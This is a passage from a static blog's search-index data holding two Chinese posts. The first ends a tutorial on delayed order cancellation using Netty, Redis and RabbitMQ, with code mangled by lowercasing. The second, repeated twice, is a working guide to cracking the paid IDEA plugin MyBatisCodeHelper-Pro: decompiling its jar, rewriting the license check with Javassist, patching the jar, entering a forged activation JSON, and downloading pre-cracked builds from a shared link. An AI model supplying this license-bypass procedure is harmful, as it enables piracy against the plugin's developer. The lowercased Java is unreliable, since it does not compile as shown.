<version>4.1.24.final</version>\n\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n测试代码hashedwheeltimertest如下所示\n\npackage com.rjzheng.delay3;\n\nimport io.netty.util.hashedwheeltimer;\n\nimport io.netty.util.timeout;\n\nimport io.netty.util.timer;\n\nimport io.netty.util.timertask;\n\nimport java.util.concurrent.timeunit;\n\npublic class hashedwheeltimertest {\n\n    static class mytimertask implements timertask{\n\n        boolean flag;\n\n        public mytimertask(boolean flag){\n\n            this.flag = flag;\n\n        }\n\n        public void run(timeout timeout) throws exception {\n\n            // todo auto-generated method stub\n\n             system.out.println("要去数据库删除订单了。。。。");\n\n             this.flag =false;\n\n        }\n\n    }\n\n    public static void main(string[] argv) {\n\n        mytimertask timertask = new mytimertask(true);\n\n        timer timer = new hashedwheeltimer();\n\n        timer.newtimeout(timertask, 5, timeunit.seconds);\n\n        int i = 1;\n\n        while(timertask.flag){\n\n            try {\n\n                thread.sleep(1000);\n\n            } catch (interruptedexception e) {\n\n                // todo auto-generated catch block\n\n                e.printstacktrace();\n\n            }\n\n            system.out.println(i+"秒过去了");\n\n            i++;\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n输出如下\n\n1秒过去了\n\n2秒过去了\n\n3秒过去了\n\n4秒过去了\n\n5秒过去了\n\n要去数据库删除订单了。。。。\n\n6秒过去了\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n优缺点\n\n优点:效率高,任务触发时间延迟时间比delayqueue低，代码复杂度比delayqueue低。\n\n缺点:\n\n(1)服务器重启后，数据全部消失，怕宕机\n\n(2)集群扩展相当麻烦\n\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现oom异常\n\n\n# 4、redis缓存\n\n * 思路一\n\n利用redis的zset,zset是一个有序集合，每一个元素(member)都关联了一个score,通过score排序来取集合中的值\n\n添加元素:zadd key score member [[score member] [score member] …]\n\n按顺序查询元素:zrange key start stop [withscores]\n\n查询元素score:zscore key member\n\n移除元素:zrem key member [member …]\n\n测试如下\n\n添加单个元素\n\nredis> zadd page_rank 10 google.com\n\n(integer) 1\n\n添加多个元素\n\nredis> zadd page_rank 9 baidu.com 8 bing.com\n\n(integer) 2\n\nredis> zrange page_rank 0 -1 withscores\n\n1) "bing.com"\n\n2) "8"\n\n3) "baidu.com"\n\n4) "9"\n\n5) "google.com"\n\n6) "10"\n\n查询元素的score值\n\nredis> zscore page_rank bing.com\n\n"8"\n\n移除单个元素\n\nredis> zrem page_rank google.com\n\n(integer) 1\n\nredis> zrange page_rank 0 -1 withscores\n\n1) "bing.com"\n\n2) "8"\n\n3) "baidu.com"\n\n4) "9"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n那么如何实现呢？我们将订单超时时间戳与订单号分别设置为score和member,系统扫描第一个元素判断是否超时，具体如下图所示\n\n\n\n实现一\n\npackage com.rjzheng.delay4;\n\nimport java.util.calendar;\n\nimport java.util.set;\n\nimport redis.clients.jedis.jedis;\n\nimport redis.clients.jedis.jedispool;\n\nimport redis.clients.jedis.tuple;\n\npublic class apptest {\n\n    private static final string addr = "127.0.0.1";\n\n    private static final int port = 6379;\n\n    private static jedispool jedispool = new jedispool(addr, port);\n\n    public static jedis getjedis() {\n\n       return jedispool.getresource();\n\n    }\n\n    //生产者,生成5个订单放进去\n\n    public void productiondelaymessage(){\n\n        for(int i=0;i<5;i++){\n\n            //延迟3秒\n\n            calendar cal1 = calendar.getinstance();\n\n            cal1.add(calendar.second, 3);\n\n            int second3later = (int) (cal1.gettimeinmillis() / 1000);\n\n            apptest.getjedis().zadd("orderid",second3later,"oid0000001"+i);\n\n            system.out.println(system.currenttimemillis()+"ms:redis生成了一个订单任务：订单id为"+"oid0000001"+i);\n\n        }\n\n    }\n\n    //消费者，取订单\n\n    public void consumerdelaymessage(){\n\n        jedis jedis = apptest.getjedis();\n\n        while(true){\n\n            set<tuple> items = jedis.zrangewithscores("orderid", 0, 1);\n\n            if(items == null || items.isempty()){\n\n                system.out.println("当前没有等待的任务");\n\n                try {\n\n                    thread.sleep(500);\n\n                } catch (interruptedexception e) {\n\n                    // todo auto-generated catch block\n\n                    e.printstacktrace();\n\n                }\n\n                continue;\n\n            }\n\n            int  score = (int) ((tuple)items.toarray()[0]).getscore();\n\n            calendar cal = calendar.getinstance();\n\n            int nowsecond = (int) (cal.gettimeinmillis() / 1000);\n\n            if(nowsecond >= score){\n\n                string orderid = ((tuple)items.toarray()[0]).getelement();\n\n                jedis.zrem("orderid", orderid);\n\n                system.out.println(system.currenttimemillis() +"ms:redis消费了一个任务：消费的订单orderid为"+orderid);\n\n            }\n\n        }\n\n    }\n\n    public static void main(string[] args) {\n\n        apptest apptest =new apptest();\n\n        apptest.productiondelaymessage();\n\n        apptest.consumerdelaymessage();\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n\n\n此时对应输出如下\n\n\n\n可以看到，几乎都是3秒之后，消费订单。\n\n然而，这一版存在一个致命的硬伤，在高并发条件下，多消费者会取到同一个订单号，我们上测试代码threadtest\n\npackage com.rjzheng.delay4;\n\nimport java.util.concurrent.countdownlatch;\n\npublic class threadtest {\n\n    private static final int threadnum = 10;\n\n    private static countdownlatch cdl = newcountdownlatch(threadnum);\n\n    static class delaymessage implements runnable{\n\n        public void run() {\n\n            try {\n\n                cdl.await();\n\n            } catch (interruptedexception e) {\n\n                // todo auto-generated catch block\n\n                e.printstacktrace();\n\n            }\n\n            apptest apptest =new apptest();\n\n            apptest.consumerdelaymessage();\n\n        }\n\n    }\n\n    public static void main(string[] args) {\n\n        apptest apptest =new apptest();\n\n        apptest.productiondelaymessage();\n\n        for(int i=0;i<threadnum;i++){\n\n            new thread(new delaymessage()).start();\n\n            cdl.countdown();\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n输出如下所示\n\n\n\n显然，出现了多个线程消费同一个资源的情况。\n\n解决方案\n\n(1)用分布式锁，但是用分布式锁，性能下降了，该方案不细说。\n\n(2)对zrem的返回值进行判断，只有大于0的时候，才消费数据，于是将consumerdelaymessage()方法里的\n\nif(nowsecond >= score){\n\n    string orderid = ((tuple)items.toarray()[0]).getelement();\n\n    jedis.zrem("orderid", orderid);\n\n    system.out.println(system.currenttimemillis()+"ms:redis消费了一个任务：消费的订单orderid为"+orderid);\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n修改为\n\nif(nowsecond >= score){\n\n    string orderid = ((tuple)items.toarray()[0]).getelement();\n\n    long num = jedis.zrem("orderid", orderid);\n\n    if( num != null && num>0){\n\n        system.out.println(system.currenttimemillis()+"ms:redis消费了一个任务：消费的订单orderid为"+orderid);\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n在这种修改后，重新运行threadtest类，发现输出正常了\n\n * 思路二\n\n该方案使用redis的keyspace notifications，中文翻译就是键空间机制，就是利用该机制可以在key失效之后，提供一个回调，实际上是redis会给客户端发送一个消息。是需要redis版本2.8以上。\n\n实现二\n\n在redis.conf中，加入一条配置\n\nnotify-keyspace-events ex\n\n运行代码如下\n\npackage com.rjzheng.delay5;\n\nimport redis.clients.jedis.jedis;\n\nimport redis.clients.jedis.jedispool;\n\nimport redis.clients.jedis.jedispubsub;\n\npublic class redistest {\n\n    private static final string addr = "127.0.0.1";\n\n    private static final int port = 6379;\n\n    private static jedispool jedis = new jedispool(addr, port);\n\n    private static redissub sub = new redissub();\n\n    public static void init() {\n\n        new thread(new runnable() {\n\n            public void run() {\n\n                jedis.getresource().subscribe(sub, "__keyevent@0__:expired");\n\n            }\n\n        }).start();\n\n    }\n\n    public static void main(string[] args) throws interruptedexception {\n\n        init();\n\n        for(int i =0;i<10;i++){\n\n            string orderid = "oid000000"+i;\n\n            jedis.getresource().setex(orderid, 3, orderid);\n\n            system.out.println(system.currenttimemillis()+"ms:"+orderid+"订单生成");\n\n        }\n\n    }\n\n    static class redissub extends jedispubsub {\n\n        <ahref=\'http://www.jobbole.com/members/wx610506454\'>@override</a>\n\n        public void onmessage(string channel, string message) {\n\n            system.out.println(system.currenttimemillis()+"ms:"+message+"订单取消");\n\n        }\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n输出如下\n\n\n\n可以明显看到3秒过后，订单取消了\n\nps:redis的pub/sub机制存在一个硬伤，官网内容如下\n\n原:because redis pub/sub is fire and forget currently there is no way to use this feature if your application demands reliable notification of events, that is, if your pub/sub client disconnects, and reconnects later, all the events delivered during the time the client was disconnected are lost.\n\n翻: redis的发布/订阅目前是即发即弃(fire and forget)模式的，因此无法实现事件的可靠通知。也就是说，如果发布/订阅的客户端断链之后又重连，则在客户端断链期间的所有事件都丢失了。因此，方案二不是太推荐。当然，如果你对可靠性要求不高，可以使用。\n\n优缺点\n\n优点:(1)由于使用redis作为消息通道，消息都存储在redis中。如果发送程序或者任务处理程序挂了，重启之后，还有重新处理数据的可能性。(2)做集群扩展相当方便 (3)时间准确度高\n\n缺点:(1)需要额外进行redis维护\n\n\n# 5、使用消息队列\n\n我们可以采用rabbitmq的延时队列。rabbitmq具有以下两个特性，可以实现延迟队列\n\nrabbitmq可以针对queue和message设置 x-message-tt，来控制消息的生存时间，如果超时，则消息变为dead letter\n\nlrabbitmq的queue可以配置x-dead-letter-exchange 和x-dead-letter-routing-key（可选）两个参数，用来控制队列内出现了deadletter，则按照这两个参数重新路由。结合以上两个特性，就可以模拟出延迟消息的功能,具体的，我改天再写一篇文章，这里再讲下去，篇幅太长。\n\n优缺点\n\n优点: 高效,可以利用rabbitmq的分布式特性轻易的进行横向扩展,消息支持持久化增加了可靠性。\n\n缺点：本身的易用度要依赖于rabbitmq的运维.因为要引用rabbitmq,所以复杂度和成本变高。\n\n\n# 参考\n\nhttps://weihubeats.blog.csdn.net/article/details/106279593\n\nhttps://juejin.cn/post/7006898754926329869',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"IDEA MyBatisCodeHelper-Pro 最新版破解",frontmatter:{title:"IDEA MyBatisCodeHelper-Pro 最新版破解",date:"2023-05-19T00:00:00.000Z",tags:["破解","IDEA"],categories:["知识晶体 Q&A"],isShowComments:!0},regularPath:"/views/crack/mybatiscodehelperprocrack.html",relativePath:"views/crack/mybatiscodehelperprocrack.md",key:"v-12885118",path:"/views/crack/mybatiscodehelperprocrack.html",headers:[{level:2,title:"下载 MyBatisCodeHelper-Pro",slug:"下载-mybatiscodehelper-pro",normalizedTitle:"下载 mybatiscodehelper-pro",charIndex:186},{level:2,title:"下载 cfr",slug:"下载-cfr",normalizedTitle:"下载 cfr",charIndex:214},{level:2,title:"使用 Javassist 修改类文件",slug:"使用-javassist-修改类文件",normalizedTitle:"使用 javassist 修改类文件",charIndex:224},{level:2,title:"替换 jar 包的对应 class 文件",slug:"替换-jar-包的对应-class-文件",normalizedTitle:"替换 jar 包的对应 class 文件",charIndex:246},{level:2,title:"查看结果",slug:"查看结果",normalizedTitle:"查看结果",charIndex:270},{level:2,title:"成品",slug:"成品",normalizedTitle:"成品",charIndex:278}],excerpt:"<Boxx/>\n<p>MyBatisCodeHelper-Pro 是我一直使用的一款 IDEA 插件，和其他同类型插件相比，它的代码生成和自动补全等功能帮我极大的提升了开发效率。</p>\n<p>但必须收费版才能体验到这些强大的功能，而我一直是 idea 最新版用户，网上一些 MyBatisCodeHelper-Pro 2.x 破解老版本不适用，所以搜集了一些资料，最终出来这个最新版的破解。</p>\n",headersStr:"下载 MyBatisCodeHelper-Pro 下载 cfr 使用 Javassist 修改类文件 替换 jar 包的对应 class 文件 查看结果 成品",content:'MyBatisCodeHelper-Pro 是我一直使用的一款 IDEA 插件，和其他同类型插件相比，它的代码生成和自动补全等功能帮我极大的提升了开发效率。\n\n但必须收费版才能体验到这些强大的功能，而我一直是 idea 最新版用户，网上一些 MyBatisCodeHelper-Pro 2.x 破解老版本不适用，所以搜集了一些资料，最终出来这个最新版的破解。\n\n\n\n * 下载 MyBatisCodeHelper-Pro\n * 下载 cfr\n * 使用 Javassist 修改类文件\n * 替换 jar 包的对应 class 文件\n * 查看结果\n * 成品\n\n\n\n> 提前申明：\n> \n> 这篇文章只用于作者个人记录，任何人不得转载、分享。不转发不扩散，如因此造成的任何损失或其他影响，本人概不承担。\n> \n> MyBatisCodeHelper-Pro 是一款很不错的 IDEA 插件，有能力的还是购买正版授权。\n> \n> 如官方侵权或产生其他影响请联系我立即删除。\n\n\n# 下载 MyBatisCodeHelper-Pro\n\n在 idea 插件市场 下载所需版本。\n\n下载目前最新版：MybatisCodeHelperNew-3.1.9.zip。解压，找到 jar 包：MyBatisCodeHelper-Pro-obfuss.jar。\n\n\n# 下载 cfr\n\n一个 Java 反编译器，官网：https://www.benf.org/other/cfr\n\n下载好后，将 cfr-0.152.jar 和 MyBatisCodeHelper-Pro-obfuss.jar 放在同一目录下，执行命令：\n\njava -jar cfr-0.152.jar MyBatisCodeHelper-Pro-obfuss.jar --renamedupmembers true --hideutf false >> a.txt\n\n\n1\n\n\n等待数秒钟命令执行完毕，分析 a.txt 文件：\n\n 1. 最终定位到：搜索 @SerializedName(value="validTo")\n\n/*\n * Decompiled with CFR 0.152.\n * \n * Could not load the following classes:\n *  com.google.gson.annotations.SerializedName\n *  kotlin.TypeCastException\n */\npackage com.ccnode.codegenerator.e.f;\n\nimport com.ccnode.codegenerator.myconfigurable.DomainObject;\nimport com.google.gson.annotations.SerializedName;\nimport kotlin.TypeCastException;\n\npublic class c {\n    // 付费密钥\n    @SerializedName(value="paidKey")\n    private String e;\n    // 校验是否通过\n    @SerializedName(value="valid")\n    private Boolean c;\n    // 机器码，激活时会显示\n    @SerializedName(value="userMac")\n    private String a;\n    // 激活的截至日期\n    @SerializedName(value="validTo")\n    private Long b;\n    private static String d;\n    private static final String[] bb;\n    private static final String[] cb;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n我加了注释，然后我们使用 Java 字节码技术修改这个类的各个属性 get 方法，使之直接返回正确的值即可。\n\n 2. 通过上述方法随便输入激活码激活时，正常都是成功的，但有的可能会发现激活是吧，报错：base64解密异常，分析报错信息\n\n最终定位到：打开 a.txt，搜索 private static Gson\n\n找到如下所在的包及类：\n\n/*\n * Decompiled with CFR 0.152.\n * \n * Could not load the following classes:\n *  com.google.gson.Gson\n */\npackage com.ccnode.codegenerator.e.e;\n\nimport com.ccnode.codegenerator.e.e.c;\nimport com.google.gson.Gson;\nimport java.io.UnsupportedEncodingException;\nimport java.util.Base64;\n\npublic class a {\n    private static Gson a;\n    private static final String[] bb;\n    private static final String[] cb;\n\n    public static com.ccnode.codegenerator.e.f.c a(String string) {\n        String string2;\n        byte[] byArray = c.b(c.b(com.ccnode.codegenerator.e.e.a.b(-25012, 31799)), Base64.getDecoder().decode(string));\n        com.ccnode.codegenerator.e.f.c c2 = null;\n        try {\n            string2 = new String(byArray, com.ccnode.codegenerator.e.e.a.b(-25009, -31477));\n        }\n        catch (UnsupportedEncodingException unsupportedEncodingException) {\n            throw new RuntimeException(unsupportedEncodingException);\n        }\n        try {\n            c2 = (com.ccnode.codegenerator.e.f.c)a.fromJson(string2, com.ccnode.codegenerator.e.f.c.class);\n        }\n        catch (Exception exception) {\n            throw new RuntimeException(com.ccnode.codegenerator.e.e.a.b(-25010, -18101) + string2, exception);\n        }\n        return c2;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n其实想想也是，肯定是这个类解析转换为指定信息，然后给了第一步的 com.ccnode.codegenerator.e.f.c。看他里面逻辑无非就是 base64 解析，然后 gson 转换。直接修改这个类即可。\n\n\n# 使用 Javassist 修改类文件\n\n添加 maven 依赖：\n\n<dependency>\n    <groupId>org.javassist</groupId>\n    <artifactId>javassist</artifactId>\n    <version>3.25.0-GA</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n如上分析，主要修改的就是 com.ccnode.codegenerator.e.e.a 的 a 方法。\n\n    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {\n        // 加载类\n        ClassPool classPool = ClassPool.getDefault();\n        // 直接使用 jar 路径\n        classPool.appendClassPath("Downloads\\\\Compressed\\\\MyBatisCodeHelper-Pro-obfuss.jar");\n        classPool.appendClassPath("maven\\\\repositroy\\\\com\\\\google\\\\code\\\\gson\\\\gson\\\\2.10.1\\\\gson-2.10.1.jar");\n        // 或者添加 class 目录\n        //classPool.appendClassPath("");\n\n        // 获取指定类\n        CtClass ctClass = classPool.get("com.ccnode.codegenerator.e.e.a");\n        CtMethod parseLicenseMethod = ctClass.getDeclaredMethod("a", new CtClass[] { classPool.get("java.lang.String") });\n        StringBuffer bodyBuff = new StringBuffer();\n        bodyBuff.append("{")\n                .append("\tcom.google.gson.Gson gson = new com.google.gson.Gson();")\n                .append("\tcom.ccnode.codegenerator.e.f.c e = (com.ccnode.codegenerator.e.f.c)gson.fromJson($1,com.ccnode.codegenerator.e.f.c.class);")\n                .append("\treturn e;")\n                .append("}");\n        parseLicenseMethod.setBody(bodyBuff.toString());\n\n        // 对修改的文件，写出到一个新文件\n        ctClass.writeFile("Downloads\\\\Compressed\\\\MyBatisCodeHelper-Pro-obfuss-3.1.9-new");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n运行完成后，会将修改的 class 文件生成到指定目录下。\n\n\n# 替换 jar 包的对应 class 文件\n\n使用压缩工具 Bandzip 或 7zip 替换都有问题。\n\n直接使用 Java 命令替换 jar 包中的指定 class 文件：\n\n// MyBatisCodeHelper-Pro-obfuss.jar 文件和 com 是同级目录\njar uvf MyBatisCodeHelper-Pro-obfuss.jar com\\ccnode\\codegenerator\\e\\e\\a.class\n// 输出结果\n// 正在添加: com/ccnode/codegenerator/e/e/a.class(输入 = 4937) (输出 = 3210)(压缩了 34%)\n\n\n1\n2\n3\n4\n\n\n这里值得注意的是 a.class 必须放在 com\\ccnode\\codegenerator\\e\\e\\a.class 文件下，要和 jar 里的的路径对应起来。\n\n贴出 jar 命令参数详解：\n\n-u 添加文件到jar包中\n-v 生成详细的报造，并输出至标准设备\n-f 指定jar包的文件名\n-c 创建一个jar包\n-t 显示jar中的内容列表\n-x 解压jar包\n-m 指定manifest.mf文件.(manifest.mf文件中可以对jar包及其中的内容作一些一设置)\n-0 产生jar包时不对其中的内容进行压缩处理\n-M 不产生所有文件的清单文件(Manifest.mf)。这个参数与忽略掉-m参数的设置\n-i 为指定的jar文件创建索引文件\n-C 表示转到相应的目录下执行jar命令,相当于cd到那个目录，然后不带-C执行jar命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 查看结果\n\n最后再使用 jd-gui 或其他反编译工具，先找到对应 class 文件，看一下是否替换成功。\n\n然后将更新后的这个 jar 包，替换原始 jar 包，重启 idea，按如下格式输入离线激活码激活，大功告成。\n\n{\n    "paidKey": "abcdefg",\n    "valid": true,\n    "userMac": "离线激活时显示的唯一码",\n    "validTo": 4859711999000\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 成品\n\n最后，如果懒得搞的话，贴几个成品包吧，解压到 IDEA 插件目录即可，随缘更新：\n\n> 链接: https://pan.baidu.com/s/1_rKdAoDG8ldgojyWXO7Pgg 提取码: znot 复制这段内容后打开百度网盘手机App，操作更方便哦\n> \n> -- 来自百度网盘超级会员v10的分享',normalizedContent:'mybatiscodehelper-pro 是我一直使用的一款 idea 插件，和其他同类型插件相比，它的代码生成和自动补全等功能帮我极大的提升了开发效率。\n\n但必须收费版才能体验到这些强大的功能，而我一直是 idea 最新版用户，网上一些 mybatiscodehelper-pro 2.x 破解老版本不适用，所以搜集了一些资料，最终出来这个最新版的破解。\n\n\n\n * 下载 mybatiscodehelper-pro\n * 下载 cfr\n * 使用 javassist 修改类文件\n * 替换 jar 包的对应 class 文件\n * 查看结果\n * 成品\n\n\n\n> 提前申明：\n> \n> 这篇文章只用于作者个人记录，任何人不得转载、分享。不转发不扩散，如因此造成的任何损失或其他影响，本人概不承担。\n> \n> mybatiscodehelper-pro 是一款很不错的 idea 插件，有能力的还是购买正版授权。\n> \n> 如官方侵权或产生其他影响请联系我立即删除。\n\n\n# 下载 mybatiscodehelper-pro\n\n在 idea 插件市场 下载所需版本。\n\n下载目前最新版：mybatiscodehelpernew-3.1.9.zip。解压，找到 jar 包：mybatiscodehelper-pro-obfuss.jar。\n\n\n# 下载 cfr\n\n一个 java 反编译器，官网：https://www.benf.org/other/cfr\n\n下载好后，将 cfr-0.152.jar 和 mybatiscodehelper-pro-obfuss.jar 放在同一目录下，执行命令：\n\njava -jar cfr-0.152.jar mybatiscodehelper-pro-obfuss.jar --renamedupmembers true --hideutf false >> a.txt\n\n\n1\n\n\n等待数秒钟命令执行完毕，分析 a.txt 文件：\n\n 1. 最终定位到：搜索 @serializedname(value="validto")\n\n/*\n * decompiled with cfr 0.152.\n * \n * could not load the following classes:\n *  com.google.gson.annotations.serializedname\n *  kotlin.typecastexception\n */\npackage com.ccnode.codegenerator.e.f;\n\nimport com.ccnode.codegenerator.myconfigurable.domainobject;\nimport com.google.gson.annotations.serializedname;\nimport kotlin.typecastexception;\n\npublic class c {\n    // 付费密钥\n    @serializedname(value="paidkey")\n    private string e;\n    // 校验是否通过\n    @serializedname(value="valid")\n    private boolean c;\n    // 机器码，激活时会显示\n    @serializedname(value="usermac")\n    private string a;\n    // 激活的截至日期\n    @serializedname(value="validto")\n    private long b;\n    private static string d;\n    private static final string[] bb;\n    private static final string[] cb;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n我加了注释，然后我们使用 java 字节码技术修改这个类的各个属性 get 方法，使之直接返回正确的值即可。\n\n 2. 通过上述方法随便输入激活码激活时，正常都是成功的，但有的可能会发现激活是吧，报错：base64解密异常，分析报错信息\n\n最终定位到：打开 a.txt，搜索 private static gson\n\n找到如下所在的包及类：\n\n/*\n * decompiled with cfr 0.152.\n * \n * could not load the following classes:\n *  com.google.gson.gson\n */\npackage com.ccnode.codegenerator.e.e;\n\nimport com.ccnode.codegenerator.e.e.c;\nimport com.google.gson.gson;\nimport java.io.unsupportedencodingexception;\nimport java.util.base64;\n\npublic class a {\n    private static gson a;\n    private static final string[] bb;\n    private static final string[] cb;\n\n    public static com.ccnode.codegenerator.e.f.c a(string string) {\n        string string2;\n        byte[] byarray = c.b(c.b(com.ccnode.codegenerator.e.e.a.b(-25012, 31799)), base64.getdecoder().decode(string));\n        com.ccnode.codegenerator.e.f.c c2 = null;\n        try {\n            string2 = new string(byarray, com.ccnode.codegenerator.e.e.a.b(-25009, -31477));\n        }\n        catch (unsupportedencodingexception unsupportedencodingexception) {\n            throw new runtimeexception(unsupportedencodingexception);\n        }\n        try {\n            c2 = (com.ccnode.codegenerator.e.f.c)a.fromjson(string2, com.ccnode.codegenerator.e.f.c.class);\n        }\n        catch (exception exception) {\n            throw new runtimeexception(com.ccnode.codegenerator.e.e.a.b(-25010, -18101) + string2, exception);\n        }\n        return c2;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n其实想想也是，肯定是这个类解析转换为指定信息，然后给了第一步的 com.ccnode.codegenerator.e.f.c。看他里面逻辑无非就是 base64 解析，然后 gson 转换。直接修改这个类即可。\n\n\n# 使用 javassist 修改类文件\n\n添加 maven 依赖：\n\n<dependency>\n    <groupid>org.javassist</groupid>\n    <artifactid>javassist</artifactid>\n    <version>3.25.0-ga</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n如上分析，主要修改的就是 com.ccnode.codegenerator.e.e.a 的 a 方法。\n\n    public static void main(string[] args) throws notfoundexception, cannotcompileexception, ioexception {\n        // 加载类\n        classpool classpool = classpool.getdefault();\n        // 直接使用 jar 路径\n        classpool.appendclasspath("downloads\\\\compressed\\\\mybatiscodehelper-pro-obfuss.jar");\n        classpool.appendclasspath("maven\\\\repositroy\\\\com\\\\google\\\\code\\\\gson\\\\gson\\\\2.10.1\\\\gson-2.10.1.jar");\n        // 或者添加 class 目录\n        //classpool.appendclasspath("");\n\n        // 获取指定类\n        ctclass ctclass = classpool.get("com.ccnode.codegenerator.e.e.a");\n        ctmethod parselicensemethod = ctclass.getdeclaredmethod("a", new ctclass[] { classpool.get("java.lang.string") });\n        stringbuffer bodybuff = new stringbuffer();\n        bodybuff.append("{")\n                .append("\tcom.google.gson.gson gson = new com.google.gson.gson();")\n                .append("\tcom.ccnode.codegenerator.e.f.c e = (com.ccnode.codegenerator.e.f.c)gson.fromjson($1,com.ccnode.codegenerator.e.f.c.class);")\n                .append("\treturn e;")\n                .append("}");\n        parselicensemethod.setbody(bodybuff.tostring());\n\n        // 对修改的文件，写出到一个新文件\n        ctclass.writefile("downloads\\\\compressed\\\\mybatiscodehelper-pro-obfuss-3.1.9-new");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n运行完成后，会将修改的 class 文件生成到指定目录下。\n\n\n# 替换 jar 包的对应 class 文件\n\n使用压缩工具 bandzip 或 7zip 替换都有问题。\n\n直接使用 java 命令替换 jar 包中的指定 class 文件：\n\n// mybatiscodehelper-pro-obfuss.jar 文件和 com 是同级目录\njar uvf mybatiscodehelper-pro-obfuss.jar com\\ccnode\\codegenerator\\e\\e\\a.class\n// 输出结果\n// 正在添加: com/ccnode/codegenerator/e/e/a.class(输入 = 4937) (输出 = 3210)(压缩了 34%)\n\n\n1\n2\n3\n4\n\n\n这里值得注意的是 a.class 必须放在 com\\ccnode\\codegenerator\\e\\e\\a.class 文件下，要和 jar 里的的路径对应起来。\n\n贴出 jar 命令参数详解：\n\n-u 添加文件到jar包中\n-v 生成详细的报造，并输出至标准设备\n-f 指定jar包的文件名\n-c 创建一个jar包\n-t 显示jar中的内容列表\n-x 解压jar包\n-m 指定manifest.mf文件.(manifest.mf文件中可以对jar包及其中的内容作一些一设置)\n-0 产生jar包时不对其中的内容进行压缩处理\n-m 不产生所有文件的清单文件(manifest.mf)。这个参数与忽略掉-m参数的设置\n-i 为指定的jar文件创建索引文件\n-c 表示转到相应的目录下执行jar命令,相当于cd到那个目录，然后不带-c执行jar命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 查看结果\n\n最后再使用 jd-gui 或其他反编译工具，先找到对应 class 文件，看一下是否替换成功。\n\n然后将更新后的这个 jar 包，替换原始 jar 包，重启 idea，按如下格式输入离线激活码激活，大功告成。\n\n{\n    "paidkey": "abcdefg",\n    "valid": true,\n    "usermac": "离线激活时显示的唯一码",\n    "validto": 4859711999000\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 成品\n\n最后，如果懒得搞的话，贴几个成品包吧，解压到 idea 插件目录即可，随缘更新：\n\n> 链接: https://pan.baidu.com/s/1_rkdaodg8ldgojywxo7pgg 提取码: znot 复制这段内容后打开百度网盘手机app，操作更方便哦\n> \n> -- 来自百度网盘超级会员v10的分享',charsets:{cjk:!0},lastUpdated:"2024/11/15, 